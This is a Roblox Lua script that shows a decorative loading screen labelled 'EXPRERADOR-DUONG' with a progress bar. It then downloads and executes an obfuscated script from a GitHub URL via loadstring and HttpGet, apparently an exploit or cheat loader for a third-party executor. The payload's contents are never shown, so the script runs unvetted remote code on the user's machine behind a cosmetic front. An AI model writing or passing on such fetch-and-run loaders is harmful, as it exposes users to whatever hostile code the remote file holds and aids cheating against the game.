local TweenService = game:GetService("TweenService")
local playerGui = game.Players.LocalPlayer.PlayerGui
local screenGui = Instance.new("ScreenGui", playerGui)

local function createLoadingScreen()
    local frame = Instance.new("Frame", screenGui)
    frame.Size, frame.Position, frame.BackgroundColor3, frame.BackgroundTransparency = UDim2.new(0.4, 0, 0.4, 0), UDim2.new(0.3, 0, 0.3, 0), Color3.fromRGB(0, 0, 0), 0.1
    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 20)

    local function createLabel(text, size, pos)
        local label = Instance.new("TextLabel", frame)
        label.Size, label.Position, label.Text, label.TextColor3, label.BackgroundTransparency, label.TextScaled = size, pos, text, Color3.new(1, 1, 1), 1, true
        return label
    end

    createLabel("EXPRERADOR-DUONG", UDim2.new(0.8, 0, 0.2, 0), UDim2.new(0.1, 0, 0.1, 0))
    createLabel("Đang tải...", UDim2.new(0.8, 0, 0.1, 0), UDim2.new(0.1, 0, 0.65, 0))

    local progressBarBg = Instance.new("Frame", frame)
    progressBarBg.Size, progressBarBg.Position, progressBarBg.BackgroundColor3 = UDim2.new(0.8, 0, 0.1, 0), UDim2.new(0.1, 0, 0.75, 0), Color3.fromRGB(200, 200, 200)
    Instance.new("UICorner", progressBarBg).CornerRadius = UDim.new(0, 15)

    local progressBar = Instance.new("Frame", progressBarBg)
    progressBar.Size, progressBar.BackgroundColor3 = UDim2.new(0, 0, 1, 0), Color3.fromRGB(0, 102, 204)
    Instance.new("UICorner", progressBar).CornerRadius = UDim.new(0, 15)

    TweenService:Create(progressBar, TweenInfo.new(3, Enum.EasingStyle.Linear), {Size = UDim2.new(1, 0, 1, 0)}):Play()
    TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency = 0.1}):Play()

    wait(3)
    frame:Destroy()
end

spawn(createLoadingScreen)
spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Duongbeta1/D-ng/refs/heads/main/obf_XP8c14xu61oMuqjq1W5apd7mU63m1XK6l9P4ZdXjpf26iNQh254V4Q9CqV11DED6.lua.txt"))()
end)
